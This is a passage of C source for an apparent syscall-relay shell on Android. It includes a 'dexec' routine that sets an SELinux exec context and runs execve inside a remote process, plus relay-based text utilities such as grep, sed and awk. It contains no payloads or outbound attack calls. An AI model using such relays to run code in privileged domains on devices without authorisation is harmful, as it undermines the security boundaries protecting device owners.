    /* Build marker and timestamp for logcat -T */
    char marker_msg[512];
    snprintf(marker_msg, sizeof(marker_msg),
             "\xF0\x9F\x94\xB5 START dexec: %s [%s]", exec_binary, domain);
    logdw_write_marker(sock, logdw_fd, marker_msg);

    struct timespec local_ts;
    clock_gettime(CLOCK_REALTIME, &local_ts);
    struct tm *tm_val = localtime(&local_ts.tv_sec);
    char ts_str[40];
    strftime(ts_str, sizeof(ts_str), "%m-%d %H:%M:%S", tm_val);
    char ts_full[48];
    snprintf(ts_full, sizeof(ts_full), "%s.%03ld",
             ts_str, local_ts.tv_nsec / 1000000);

    /* Pre-read the exec binary's file label (used in EACCES diagnostic).
     * Must be done BEFORE clone -- after clone we're in VFORK child. */
    char exec_filecon[256];
    memset(exec_filecon, 0, sizeof(exec_filecon));
    {
        int64_t lr = relay_lgetxattr(sock, exec_binary,
            "security.selinux", exec_filecon, sizeof(exec_filecon) - 1);
        if (lr > 0) {
            exec_filecon[lr] = '\0';
            /* strip trailing NUL/newline from xattr */
            while (lr > 0 && (exec_filecon[lr-1] == '\n' ||
                              exec_filecon[lr-1] == '\0'))
                exec_filecon[--lr] = '\0';
        } else {
            strcpy(exec_filecon, "(unknown)");
        }
    }

    /* CLONE_VFORK -- child gets relay, parent suspends */
    int64_t clone_ret = send_syscall(sock, SYS_clone,
        MY_CLONE_VFORK | MY_SIGCHLD, 0, 0, 0, 0, 0, 0, NULL, 0, NULL, 0);

    if (clone_ret < 0) {
        fprintf(stderr, "dexec: clone: %s\n", errno_str((int)-clone_ret));
        goto cleanup;
    }
    if (clone_ret != 0) {
        fprintf(stderr, "dexec: clone returned %lld (expected 0 from child)\n",
                (long long)clone_ret);
        goto cleanup;
    }

    /* --- TALKING TO CHILD --- */
    /* Build execve page: strings at data[0..2047], argv ptrs at data[2048..] */
    {
        uint8_t page[PAGE_SIZE];
        memset(page, 0, PAGE_SIZE);

        int str_off = 0;
        int str_offsets[MAX_ARGS];
        int exec_argc = argc - exec_argv_start;

        if (exec_argc > MAX_ARGS - 1 ||
            2048 + ((size_t)exec_argc + 1) * 8 > DATA_SIZE) {
            fprintf(stderr, "dexec: too many arguments (%d)\n", exec_argc);
            goto child_abort;
        }

        uint8_t *data = page + DATA_OFFSET;

        /* Pack exec binary path at offset 0 (used by x0 for filename) */
        size_t blen = strlen(exec_binary) + 1;
        if (blen > 2048) {
            fprintf(stderr, "dexec: path too long\n");
            goto child_abort;
        }
        memcpy(data, exec_binary, blen);

        /* Pack argv strings starting after exec binary path */
        str_off = (int)blen;
        for (int i = 0; i < exec_argc; i++) {
            const char *arg = argv[exec_argv_start + i];
            size_t alen = strlen(arg) + 1;
            if (str_off + (int)alen > 2048) {
                fprintf(stderr, "dexec: argv too large\n");
                goto child_abort;
            }
            str_offsets[i] = str_off;
            memcpy(data + str_off, arg, alen);
            str_off += (int)alen;
        }

        /* Pack argv pointer array at offset 2048 */
        for (int i = 0; i < exec_argc; i++)
            pack_u64(data + 2048 + i * 8, data_base + (uint64_t)str_offsets[i]);
        pack_u64(data + 2048 + exec_argc * 8, 0);

        /* Page header: execve(path, argv, NULL) */
        pack_u64(page + 0,  SYS_execve);
        pack_u64(page + 8,  0);            /* x0: path at data+0 */
        pack_u64(page + 16, 2048);         /* x1: argv at data+2048 */
        pack_u64(page + 24, 0);            /* x2: envp = NULL (no FLAG) */
        pack_u32(page + 56, FLAG_X0_DATA | FLAG_X1_DATA);

        send_full(sock, page, PAGE_SIZE);
        uint8_t resp[PAGE_SIZE];
        recv_full(sock, resp, PAGE_SIZE);
        int64_t exec_ret = unpack_i64(resp);

        if (exec_ret <= 0) {
            int eno = (int)-exec_ret;
            fprintf(stderr, "dexec: execve: %s\n",
                    exec_ret < 0 ? errno_str(eno) : "returned 0");
            if (eno == 13 /* EACCES */) {
                fprintf(stderr,
                    "\n"
                    "  SELinux entrypoint check failed.\n"
                    "  Target domain:  %s\n"
                    "  Exec binary:    %s\n"
                    "  Binary label:   %s\n"
                    "\n"
                    "  The %s domain does not accept this binary's file\n"
                    "  label as a valid entrypoint. Each domain can only be\n"
                    "  entered through binaries with its own *_exec label.\n"
                    "\n"
                    "  To run as %s, exec a binary labeled %s_exec instead.\n"
                    "  Example: dexec <binary-labeled-%s_exec> [args]\n"
                    "\n",
                    context, exec_binary, exec_filecon,
                    domain, domain, domain, domain);
            }
            goto child_abort;
        }

        /* exec_ret > 0 = parent's clone return = child_pid */
        child_pid = exec_ret;
        printf("[%lld] %s [%s]\n", (long long)child_pid, exec_binary, domain);
    }
    /* --- TALKING TO PARENT --- */

    /* Start client-side logcat capture */
    logcat_pid = fork();
    if (logcat_pid == 0) {
        char filter_cmd[1024];
        snprintf(filter_cmd, sizeof(filter_cmd),
            "exec logcat -b all -T '%s' -v brief"
            " | grep --line-buffered -iE '%s|\xF0\x9F\x94\xB5'",
            ts_full, domain);
        execlp("sh", "sh", "-c", filter_cmd, NULL);
        _exit(127);
    }
    if (logcat_pid > 0) track_child(logcat_pid);

    /* Wait for child with WNOHANG, then poll with increasing delays up to 75s.
     *
     * DO NOT use alarm() here. SIGALRM can fire during send_syscall()'s
     * internal select(), causing it to return INT64_MIN (false socket death).
     * Instead, handle the timeout entirely within the loop using sleep()
     * and cumulative elapsed time tracking. This keeps the relay protocol
     * safe from signal interruption. */
    {
        uint8_t wbuf[4];
        int64_t wr = send_syscall(sock, SYS_wait4,
            (uint64_t)child_pid, 0, MY_WNOHANG, 0, 0, 0,
            FLAG_X1_DATA, NULL, 0, wbuf, 4);

        if (wr == 0) {
            /* Still running -- poll with increasing backoff up to 75s total */
            int waited = 0;
            int intervals[] = {1, 2, 5, 10, 15, 20, 22};
            int nintervals = 7;
            for (int iv = 0; iv < nintervals && wr == 0; iv++) {
                sleep((unsigned)intervals[iv]);
                waited += intervals[iv];
                wr = send_syscall(sock, SYS_wait4,
                    (uint64_t)child_pid, 0, MY_WNOHANG, 0, 0, 0,
                    FLAG_X1_DATA, NULL, 0, wbuf, 4);
            }
            if (wr == 0) {
                /* Still running after 75s -- SIGKILL */
                fprintf(stderr, "dexec: child %lld timed out after %ds, sending SIGKILL\n",
                        (long long)child_pid, waited);
                relay_kill(sock, (int)child_pid, 9);
                wr = send_syscall(sock, SYS_wait4,
                    (uint64_t)child_pid, 0, 0, 0, 0, 0,
                    FLAG_X1_DATA, NULL, 0, wbuf, 4);
            }
        }

        if (wr > 0) {
            uint32_t wstat = unpack_u32(wbuf);
            if (wstat & 0x7f)
                printf("[%lld] killed by signal %d\n",
                       (long long)child_pid, wstat & 0x7f);
            else
                printf("[%lld] exited %d\n",
                       (long long)child_pid, (wstat >> 8) & 0xff);
        } else if (wr < 0) {
            fprintf(stderr, "dexec: wait4: %s\n", errno_str((int)-wr));
        }
    }

    /* Write end marker */
    snprintf(marker_msg, sizeof(marker_msg),
             "\xF0\x9F\x94\xB5 END dexec: %s [%s]", exec_binary, domain);
    logdw_write_marker(sock, logdw_fd, marker_msg);

    ret = 0;
    goto cleanup;

child_abort:
    /* Child still alive -- kill it to unfreeze parent */
    send_syscall(sock, SYS_exit, 1, 0, 0, 0, 0, 0, FLAG_EXIT, NULL, 0, NULL, 0);
    {
        uint8_t drain[PAGE_SIZE];
        recv_full(sock, drain, PAGE_SIZE);
    }
    /* Now talking to parent again */

cleanup:
    /* ALWAYS clear exec context, even if we think it was never set.
     * Belt-and-suspenders: the defensive clear at function entry handles
     * stale state from prior calls, this handles our own failures. */
    setexeccon_relay(sock, "");
    (void)execcon_set;  /* suppress unused-variable warning */
    if (logdw_fd >= 0)
        relay_close(sock, logdw_fd);
    if (logcat_pid > 0) {
        usleep(500000);
        kill(logcat_pid, SIGTERM);
        usleep(200000);
        waitpid(logcat_pid, NULL, WNOHANG);
        /* Block SIGCHLD/SIGALRM during untrack_child to prevent
         * concurrent modification of g_child_pids[] from signal handlers */
        sigset_t block_sigs, old_sigs;
        sigemptyset(&block_sigs);
        sigaddset(&block_sigs, SIGCHLD);
        sigaddset(&block_sigs, SIGALRM);
        sigprocmask(SIG_BLOCK, &block_sigs, &old_sigs);
        untrack_child(logcat_pid);
        sigprocmask(SIG_SETMASK, &old_sigs, NULL);
    }
    return ret;
}


/* ═══════════════════════════════════════════════════════════════════════════
 * NEW COMMANDS — Text Processing
 * ═══════════════════════════════════════════════════════════════════════════ */

static int cmd_head(int sock, int argc, char *argv[]) {
    int nlines = 10;
    const char *file = NULL;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-n") == 0 && i + 1 < argc) {
            nlines = atoi(argv[++i]);
        } else if (argv[i][0] == '-' && argv[i][1] >= '0' && argv[i][1] <= '9') {
            nlines = atoi(argv[i] + 1);
        } else {
            file = argv[i];
        }
    }

    if (!file) { fprintf(stderr, "head: missing file operand\n"); return 1; }

    char abs[CWD_SIZE];
    resolve_path(file, abs);

    int64_t fd = relay_openat(sock, abs, MY_O_RDONLY, 0);
    if (fd < 0) {
        fprintf(stderr, "head: %s: %s\n", abs, errno_str((int)(-fd)));
        return 1;
    }

    int lines_printed = 0;
    for (;;) {
        if (g_sigint || lines_printed >= nlines) break;
        uint8_t buf[DATA_SIZE];
        int64_t n = relay_read(sock, fd, buf, DATA_SIZE);
        if (n <= 0) break;

        for (int64_t j = 0; j < n && lines_printed < nlines; j++) {
            putchar(buf[j]);
            if (buf[j] == '\n') lines_printed++;
        }
        if ((size_t)n < DATA_SIZE) break;
    }

    relay_close(sock, fd);
    fflush(stdout);
    return 0;
}

static int cmd_tail(int sock, int argc, char *argv[]) {
    int nlines = 10;
    const char *file = NULL;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-n") == 0 && i + 1 < argc) {
            nlines = atoi(argv[++i]);
        } else if (argv[i][0] == '-' && argv[i][1] >= '0' && argv[i][1] <= '9') {
            nlines = atoi(argv[i] + 1);
        } else {
            file = argv[i];
        }
    }

    if (!file) { fprintf(stderr, "tail: missing file operand\n"); return 1; }

    char abs[CWD_SIZE];
    resolve_path(file, abs);

    uint8_t *data;
    ssize_t sz = relay_read_file(sock, abs, &data, 0);
    if (sz < 0) {
        fprintf(stderr, "tail: %s: %s\n", abs, errno_str((int)(-sz)));
        return 1;
    }

    /* Find the start position for the last N lines */
    int nl_count = 0;
    ssize_t start = sz;
    for (ssize_t i = sz - 1; i >= 0; i--) {
        if (data[i] == '\n') {
            nl_count++;
            if (nl_count > nlines) { start = i + 1; break; }
        }
    }
    if (nl_count <= nlines) start = 0;

    fwrite(data + start, 1, (size_t)(sz - start), stdout);
    fflush(stdout);
    free(data);
    return 0;
}

static int cmd_wc(int sock, int argc, char *argv[]) {
    int count_lines = 1, count_words = 1, count_bytes = 1;
    int explicit_flags = 0;

    int file_start = 1;
    for (int i = 1; i < argc; i++) {
        if (argv[i][0] == '-') {
            if (!explicit_flags) { count_lines = count_words = count_bytes = 0; explicit_flags = 1; }
            for (const char *f = argv[i] + 1; *f; f++) {
                if (*f == 'l') count_lines = 1;
                else if (*f == 'w') count_words = 1;
                else if (*f == 'c') count_bytes = 1;
            }
            file_start = i + 1;
        }
    }

    for (int fi = file_start; fi < argc; fi++) {
        char abs[CWD_SIZE];
        resolve_path(argv[fi], abs);

        uint8_t *data;
        ssize_t sz = relay_read_file(sock, abs, &data, 0);
        if (sz < 0) {
            fprintf(stderr, "wc: %s: %s\n", abs, errno_str((int)(-sz)));
            continue;
        }

        long lines = 0, words = 0;
        int in_word = 0;
        for (ssize_t j = 0; j < sz; j++) {
            if (data[j] == '\n') lines++;
            if (data[j] == ' ' || data[j] == '\t' || data[j] == '\n' || data[j] == '\r') {
                in_word = 0;
            } else {
                if (!in_word) words++;
                in_word = 1;
            }
        }

        if (count_lines) printf("%7ld ", lines);
        if (count_words) printf("%7ld ", words);
        if (count_bytes) printf("%7ld ", (long)sz);
        printf("%s\n", argv[fi]);
        free(data);
    }
    return 0;
}

/* grep helpers for recursive mode */
static int grep_file(int sock, const char *abs, const char *display_name,
                     const char *pattern, int ignore_case, int show_numbers,
                     int invert, int count_only, int files_only, int multi_file);

static void grep_recursive(int sock, const char *dirpath, const char *pattern,
                           int ignore_case, int show_numbers, int invert,
                           int count_only, int files_only, int *found_any);

static int grep_file(int sock, const char *abs, const char *display_name,
                     const char *pattern, int ignore_case, int show_numbers,
                     int invert, int count_only, int files_only, int multi_file) {
    uint8_t *data;
    ssize_t sz = relay_read_file(sock, abs, &data, 0);
    if (sz < 0) return 0;

    int match_count = 0;
    int line_num = 0;
    ssize_t line_start = 0;
    int found = 0;

    for (ssize_t j = 0; j <= sz; j++) {
        if (j == sz || data[j] == '\n') {
            line_num++;
            size_t line_len = (size_t)(j - line_start);
            char line_buf[4096];
            if (line_len >= sizeof(line_buf)) line_len = sizeof(line_buf) - 1;
            memcpy(line_buf, data + line_start, line_len);
            line_buf[line_len] = '\0';

            int match = 0;
            if (ignore_case) {
                char low_line[4096], low_pat[256];
                size_t pl = strlen(pattern);
                if (pl >= sizeof(low_pat)) pl = sizeof(low_pat) - 1;
                for (size_t k = 0; k < line_len; k++)
                    low_line[k] = (char)tolower((unsigned char)line_buf[k]);
                low_line[line_len] = '\0';
                for (size_t k = 0; k < pl; k++)
                    low_pat[k] = (char)tolower((unsigned char)pattern[k]);
                low_pat[pl] = '\0';
                match = (strstr(low_line, low_pat) != NULL);
            } else {
                match = (strstr(line_buf, pattern) != NULL);
            }

            if (invert) match = !match;

            if (match) {
                match_count++;
                found = 1;
                if (files_only) {
                    printf("%s\n", display_name);
                    break;
                }
                if (!count_only) {
                    if (multi_file) printf("%s:", display_name);
                    if (show_numbers) printf("%d:", line_num);
                    printf("%s\n", line_buf);
                }
            }
            line_start = j + 1;
        }
    }

    if (count_only) {
        if (multi_file) printf("%s:", display_name);
        printf("%d\n", match_count);
    }

    free(data);
    return found;
}

static void grep_recursive(int sock, const char *dirpath, const char *pattern,
                           int ignore_case, int show_numbers, int invert,
                           int count_only, int files_only, int *found_any) {
    if (g_sigint) return;
    int64_t fd = relay_openat(sock, dirpath, MY_O_RDONLY | MY_O_DIRECTORY, 0);
    if (fd < 0) return;

    for (;;) {
        uint8_t buf[DATA_SIZE];
        int64_t nbytes = relay_getdents64(sock, fd, buf, DATA_SIZE);
        if (nbytes <= 0) break;
        size_t pos = 0;
        while (pos < (size_t)nbytes) {
            if (g_sigint) break;
            uint16_t d_reclen = unpack_u32(buf + pos + 16) & 0xFFFF;
            uint8_t d_type = buf[pos + 18];
            const char *d_name = (const char *)(buf + pos + 19);
            if (d_reclen == 0) break;
            if (strcmp(d_name, ".") != 0 && strcmp(d_name, "..") != 0) {
                char child[CWD_SIZE];
                snprintf(child, CWD_SIZE, "%s/%s", dirpath, d_name);
                if (d_type == DT_DIR) {
                    grep_recursive(sock, child, pattern, ignore_case,
                                   show_numbers, invert, count_only, files_only, found_any);
                } else if (d_type == DT_REG || d_type == DT_UNKNOWN) {
                    if (grep_file(sock, child, child, pattern, ignore_case,
                                  show_numbers, invert, count_only, files_only, 1))
                        *found_any = 1;
                }
            }
            pos += d_reclen;
        }
    }
    relay_close(sock, fd);
}

static int cmd_grep(int sock, int argc, char *argv[]) {
    int ignore_case = 0, show_numbers = 0, invert = 0;
    int count_only = 0, files_only = 0, recursive = 0;
    const char *pattern = NULL;

    int file_start = -1;
    for (int i = 1; i < argc; i++) {
        if (argv[i][0] == '-' && !pattern) {
            for (const char *f = argv[i] + 1; *f; f++) {
                if (*f == 'i') ignore_case = 1;
                else if (*f == 'n') show_numbers = 1;
                else if (*f == 'v') invert = 1;
                else if (*f == 'c') count_only = 1;
                else if (*f == 'l') files_only = 1;
                else if (*f == 'r' || *f == 'R') recursive = 1;
            }
        } else if (!pattern) {
            pattern = argv[i];
            file_start = i + 1;
        }
    }

    if (!pattern || file_start < 0 || file_start >= argc) {
        fprintf(stderr, "grep: Usage: grep [-invcrlR] <pattern> <file/dir...>\n");
        return 1;
    }

    int found_any = 0;
    int multi_file = (argc - file_start) > 1 || recursive;

    for (int fi = file_start; fi < argc; fi++) {
        char abs[CWD_SIZE];
        resolve_path(argv[fi], abs);

        if (recursive) {
            /* Check if it's a directory */
            uint8_t statbuf[128];
            memset(statbuf, 0, sizeof(statbuf));
            int64_t ret = relay_fstatat(sock, abs, statbuf, sizeof(statbuf));
            if (ret >= 0 && (unpack_u32(statbuf + 16) & 0xF000) == 0x4000) {
                grep_recursive(sock, abs, pattern, ignore_case,
                               show_numbers, invert, count_only, files_only, &found_any);
                continue;
            }
        }

        if (grep_file(sock, abs, argv[fi], pattern, ignore_case,
                      show_numbers, invert, count_only, files_only, multi_file))
            found_any = 1;
    }
    return found_any ? 0 : 1;
}

static int cmd_sort(int sock, int argc, char *argv[]) {
    int reverse = 0, numeric = 0, unique = 0;
    const char *file = NULL;

    for (int i = 1; i < argc; i++) {
        if (argv[i][0] == '-') {
            for (const char *f = argv[i] + 1; *f; f++) {
                if (*f == 'r') reverse = 1;
                else if (*f == 'n') numeric = 1;
                else if (*f == 'u') unique = 1;
            }
        } else {
            file = argv[i];
        }
    }

    if (!file) { fprintf(stderr, "sort: missing file operand\n"); return 1; }

    char abs[CWD_SIZE];
    resolve_path(file, abs);

    uint8_t *data;
    ssize_t sz = relay_read_file(sock, abs, &data, 0);
    if (sz < 0) {
        fprintf(stderr, "sort: %s: %s\n", abs, errno_str((int)(-sz)));
        return 1;
    }

    /* Split into lines */
    char **lines = NULL;
    int nlines = 0, cap = 256;
    lines = (char **)malloc(cap * sizeof(char *));
    if (!lines) { free(data); return 1; }

    char *s = (char *)data;
    for (ssize_t j = 0; j < sz; j++) {
        if (data[j] == '\n') {
            data[j] = '\0';
            if (nlines >= cap) {
                cap *= 2;
                lines = (char **)realloc(lines, cap * sizeof(char *));
                if (!lines) { free(data); return 1; }
            }
            lines[nlines++] = s;
            s = (char *)data + j + 1;
        }
    }
    /* Last line without newline */
    if (s < (char *)data + sz) {
        if (nlines >= cap) {
            cap++;
            lines = (char **)realloc(lines, cap * sizeof(char *));
        }
        if (lines) lines[nlines++] = s;
    }

    /* Bubble sort (simple, fine for typical file sizes via relay) */
    for (int i = 0; i < nlines - 1; i++) {
        for (int j = 0; j < nlines - 1 - i; j++) {
            int cmp;
            if (numeric) {
                cmp = atoi(lines[j]) - atoi(lines[j + 1]);
            } else {
                cmp = strcmp(lines[j], lines[j + 1]);
            }
            if (reverse) cmp = -cmp;
            if (cmp > 0) {
                char *tmp = lines[j];
                lines[j] = lines[j + 1];
                lines[j + 1] = tmp;
            }
        }
    }

    /* Print */
    const char *prev = NULL;
    for (int i = 0; i < nlines; i++) {
        if (unique && prev && strcmp(lines[i], prev) == 0) continue;
        printf("%s\n", lines[i]);
        prev = lines[i];
    }

    free(lines);
    free(data);
    return 0;
}

static int cmd_uniq(int sock, int argc, char *argv[]) {
    int count_mode = 0, dup_only = 0;
    const char *file = NULL;

    for (int i = 1; i < argc; i++) {
        if (argv[i][0] == '-') {
            for (const char *f = argv[i] + 1; *f; f++) {
                if (*f == 'c') count_mode = 1;
                else if (*f == 'd') dup_only = 1;
            }
        } else {
            file = argv[i];
        }
    }

    if (!file) { fprintf(stderr, "uniq: missing file operand\n"); return 1; }

    char abs[CWD_SIZE];
    resolve_path(file, abs);

    uint8_t *data;
    ssize_t sz = relay_read_file(sock, abs, &data, 0);
    if (sz < 0) {
        fprintf(stderr, "uniq: %s: %s\n", abs, errno_str((int)(-sz)));
        return 1;
    }

    char prev_line[4096] = "";
    int cnt = 0;
    ssize_t line_start = 0;

    for (ssize_t j = 0; j <= sz; j++) {
        if (j == sz || data[j] == '\n') {
            size_t llen = (size_t)(j - line_start);
            char cur[4096];
            if (llen >= sizeof(cur)) llen = sizeof(cur) - 1;
            memcpy(cur, data + line_start, llen);
            cur[llen] = '\0';

            if (cnt > 0 && strcmp(cur, prev_line) == 0) {
                cnt++;
            } else {
                /* Flush previous */
                if (cnt > 0) {
                    if (!dup_only || cnt > 1) {
                        if (count_mode) printf("%7d %s\n", cnt, prev_line);
                        else printf("%s\n", prev_line);
                    }
                }
                strncpy(prev_line, cur, sizeof(prev_line) - 1);
                cnt = 1;
            }
            line_start = j + 1;
        }
    }
    /* Flush last */
    if (cnt > 0) {
        if (!dup_only || cnt > 1) {
            if (count_mode) printf("%7d %s\n", cnt, prev_line);
            else printf("%s\n", prev_line);
        }
    }

    free(data);
    return 0;
}

static int cmd_cut(int sock, int argc, char *argv[]) {
    char delim = '\t';
    const char *fields_spec = NULL;
    const char *file = NULL;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-d") == 0 && i + 1 < argc) {
            delim = argv[++i][0];
        } else if (strcmp(argv[i], "-f") == 0 && i + 1 < argc) {
            fields_spec = argv[++i];
        } else {
            file = argv[i];
        }
    }

    if (!fields_spec || !file) {
        fprintf(stderr, "cut: Usage: cut -d <delim> -f <fields> <file>\n");
        return 1;
    }

    /* Parse field list (comma-separated, e.g., "1,3,5") */
    int fields[32];
    int nfields = 0;
    {
        char fspec[128];
        strncpy(fspec, fields_spec, sizeof(fspec) - 1);
        fspec[sizeof(fspec) - 1] = '\0';
        char *tok = strtok(fspec, ",");
        while (tok && nfields < 32) {
            fields[nfields++] = atoi(tok);
            tok = strtok(NULL, ",");
        }
    }

    char abs[CWD_SIZE];
    resolve_path(file, abs);

    uint8_t *data;
    ssize_t sz = relay_read_file(sock, abs, &data, 0);
    if (sz < 0) {
        fprintf(stderr, "cut: %s: %s\n", abs, errno_str((int)(-sz)));
        return 1;
    }

    ssize_t line_start = 0;
    for (ssize_t j = 0; j <= sz; j++) {
        if (j == sz || data[j] == '\n') {
            size_t llen = (size_t)(j - line_start);
            char line[4096];
            if (llen >= sizeof(line)) llen = sizeof(line) - 1;
            memcpy(line, data + line_start, llen);
            line[llen] = '\0';

            /* Split by delimiter */
            char *cols[256];
            int ncols = 0;
            char *s = line;
            cols[ncols++] = s;
            while (*s && ncols < 256) {
                if (*s == delim) {
                    *s = '\0';
                    cols[ncols++] = s + 1;
                }
                s++;
            }

            /* Print requested fields */
            int first = 1;
            for (int fi = 0; fi < nfields; fi++) {
                int idx = fields[fi] - 1;
                if (idx >= 0 && idx < ncols) {
                    if (!first) putchar(delim);
                    printf("%s", cols[idx]);
                    first = 0;
                }
            }
            if (j < sz) putchar('\n');
            line_start = j + 1;
        }
    }

    free(data);
    return 0;
}

static int cmd_tr(int sock, int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "tr: Usage: tr <set1> <set2> <file>\n");
        return 1;
    }

    const char *set1 = argv[1];
    const char *set2 = argv[2];
    const char *file = (argc >= 4) ? argv[3] : NULL;

    if (!file) {
        fprintf(stderr, "tr: missing file operand (stdin not supported in relay mode)\n");
        return 1;
    }

    char abs[CWD_SIZE];
    resolve_path(file, abs);

    uint8_t *data;
    ssize_t sz = relay_read_file(sock, abs, &data, 0);
    if (sz < 0) {
        fprintf(stderr, "tr: %s: %s\n", abs, errno_str((int)(-sz)));
        return 1;
    }

    /* Build translation table */
    unsigned char xlat[256];
    for (int i = 0; i < 256; i++) xlat[i] = (unsigned char)i;

    size_t s1len = strlen(set1);
    size_t s2len = strlen(set2);
    for (size_t i = 0; i < s1len; i++) {
        unsigned char from = (unsigned char)set1[i];
        unsigned char to = (i < s2len) ? (unsigned char)set2[i] :
                           (s2len > 0 ? (unsigned char)set2[s2len - 1] : from);
        xlat[from] = to;
    }

    for (ssize_t i = 0; i < sz; i++) {
        putchar(xlat[data[i]]);
    }
    fflush(stdout);

    free(data);
    return 0;
}

static int cmd_sed(int sock, int argc, char *argv[]) {
    /* Only supports: sed 's/pat/rep/[g]' <file> */
    if (argc < 3) {
        fprintf(stderr, "sed: Usage: sed 's/pattern/replacement/[g]' <file>\n");
        return 1;
    }

    const char *expr = argv[1];
    const char *file = argv[2];

    /* Parse s/pat/rep/[g] */
    if (expr[0] != 's' || expr[1] == '\0') {
        fprintf(stderr, "sed: only 's/pattern/replacement/[g]' is supported\n");
        return 1;
    }

    char sep = expr[1];
    const char *p = expr + 2;
    const char *pat_start = p;
    while (*p && *p != sep) p++;
    if (*p != sep) { fprintf(stderr, "sed: unterminated pattern\n"); return 1; }

    char pattern[256];
    size_t plen = (size_t)(p - pat_start);
    if (plen >= sizeof(pattern)) plen = sizeof(pattern) - 1;
    memcpy(pattern, pat_start, plen);
    pattern[plen] = '\0';

    p++;
    const char *rep_start = p;
    while (*p && *p != sep) p++;

    char replacement[256];
    size_t rlen = (size_t)(p - rep_start);
    if (rlen >= sizeof(replacement)) rlen = sizeof(replacement) - 1;
    memcpy(replacement, rep_start, rlen);
    replacement[rlen] = '\0';

    int global = 0;
    if (*p == sep) {
        p++;
        if (*p == 'g') global = 1;
    }

    char abs[CWD_SIZE];
    resolve_path(file, abs);

    uint8_t *data;
    ssize_t sz = relay_read_file(sock, abs, &data, 0);
    if (sz < 0) {
        fprintf(stderr, "sed: %s: %s\n", abs, errno_str((int)(-sz)));
        return 1;
    }

    ssize_t line_start = 0;
    for (ssize_t j = 0; j <= sz; j++) {
        if (j == sz || data[j] == '\n') {
            size_t llen = (size_t)(j - line_start);
            char line[4096];
            if (llen >= sizeof(line)) llen = sizeof(line) - 1;
            memcpy(line, data + line_start, llen);
            line[llen] = '\0';

            /* Perform substitution */
            char result[8192];
            result[0] = '\0';
            char *lp = line;
            int did_sub = 0;

            while (*lp) {
                char *found = strstr(lp, pattern);
                if (found && (!did_sub || global)) {
                    size_t prefix = (size_t)(found - lp);
                    strncat(result, lp, prefix);
                    strncat(result, replacement, sizeof(result) - strlen(result) - 1);
                    lp = found + plen;
                    did_sub = 1;
                } else {
                    strncat(result, lp, sizeof(result) - strlen(result) - 1);
                    break;
                }
            }

            printf("%s", result);
            if (j < sz) putchar('\n');
            line_start = j + 1;
        }
    }

    free(data);
    return 0;
}

static int cmd_awk(int sock, int argc, char *argv[]) {
    /* Only supports: awk '{print $N}' <file> and awk -F <sep> '{print $N}' <file> */
    if (argc < 3) {
        fprintf(stderr, "awk: Usage: awk [-F sep] '{print $N}' <file>\n");
        return 1;
    }

    char field_sep = ' ';
    const char *prog = NULL;
    const char *file = NULL;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-F") == 0 && i + 1 < argc) {
            field_sep = argv[++i][0];
        } else if (!prog) {
            prog = argv[i];
        } else {
            file = argv[i];
        }
    }

    if (!prog || !file) {
        fprintf(stderr, "awk: Usage: awk [-F sep] '{print $N}' <file>\n");
        return 1;
    }

    /* Parse field numbers from '{print $N, $M}' or '{print $N}' */
    int fields[32];
    int nfields = 0;
    int print_all = 0;

    const char *pp = strstr(prog, "print");
    if (!pp) { print_all = 1; }
    else {
        pp += 5;
        while (*pp) {
            if (*pp == '$') {
                pp++;
                int n = atoi(pp);
                if (nfields < 32) fields[nfields++] = n;
                while (*pp >= '0' && *pp <= '9') pp++;
            } else {
                pp++;
            }
        }
    }

    char abs[CWD_SIZE];
    resolve_path(file, abs);

    uint8_t *data;
    ssize_t sz = relay_read_file(sock, abs, &data, 0);
    if (sz < 0) {
        fprintf(stderr, "awk: %s: %s\n", abs, errno_str((int)(-sz)));
        return 1;
    }

    ssize_t line_start = 0;
    for (ssize_t j = 0; j <= sz; j++) {
        if (j == sz || data[j] == '\n') {
            size_t llen = (size_t)(j - line_start);
            char line[4096];
            if (llen >= sizeof(line)) llen = sizeof(line) - 1;
            memcpy(line, data + line_start, llen);
            line[llen] = '\0';

            if (print_all) {
                printf("%s\n", line);
            } else {
                /* Split into fields */
                char *cols[256];
                int ncols = 0;
                char *s = line;
                while (*s && ncols < 256) {
                    while (*s == field_sep || (*s == ' ' && field_sep == ' ' && (*s == '\t')))
                        s++;
                    if (*s == '\0') break;
                    cols[ncols++] = s;
                    if (field_sep == ' ') {
                        while (*s && *s != ' ' && *s != '\t') s++;
                    } else {
                        while (*s && *s != field_sep) s++;
                    }
                    if (*s) *s++ = '\0';
                }

                for (int fi = 0; fi < nfields; fi++) {
                    int idx = fields[fi] - 1;
                    if (fi > 0) putchar(' ');
                    if (fields[fi] == 0) {
                        /* $0 = whole line */
                        char whole[4096];
                        memcpy(whole, data + line_start, llen);
                        whole[llen] = '\0';
                        printf("%s", whole);
                    } else if (idx >= 0 && idx < ncols) {
                        printf("%s", cols[idx]);
                    }
                }
                putchar('\n');
            }
            line_start = j + 1;
        }
    }

    free(data);
    return 0;
}

static int cmd_tac(int sock, int argc, char *argv[]) {
    if (argc < 2) { fprintf(stderr, "tac: missing file operand\n"); return 1; }

    char abs[CWD_SIZE];
    resolve_path(argv[1], abs);

    uint8_t *data;
    ssize_t sz = relay_read_file(sock, abs, &data, 0);
    if (sz < 0) {
        fprintf(stderr, "tac: %s: %s\n", abs, errno_str((int)(-sz)));
        return 1;
    }

    /* Collect line offsets */
    ssize_t *offsets = (ssize_t *)malloc(((size_t)sz + 1) * sizeof(ssize_t));
    if (!offsets) { free(data); return 1; }

    int nlines = 0;
    offsets[nlines++] = 0;
    for (ssize_t i = 0; i < sz; i++) {
        if (data[i] == '\n' && i + 1 < sz) {
            offsets[nlines++] = i + 1;
        }
    }

    for (int i = nlines - 1; i >= 0; i--) {
        ssize_t start = offsets[i];
        ssize_t end = (i + 1 < nlines) ? offsets[i + 1] : sz;
        fwrite(data + start, 1, (size_t)(end - start), stdout);
        if (end == sz && data[sz - 1] != '\n') putchar('\n');
    }

    fflush(stdout);
    free(offsets);
    free(data);
    return 0;
}

static int cmd_rev(int sock, int argc, char *argv[]) {
    if (argc < 2) { fprintf(stderr, "rev: missing file operand\n"); return 1; }

    char abs[CWD_SIZE];
    resolve_path(argv[1], abs);

    uint8_t *data;
    ssize_t sz = relay_read_file(sock, abs, &data, 0);
    if (sz < 0) {
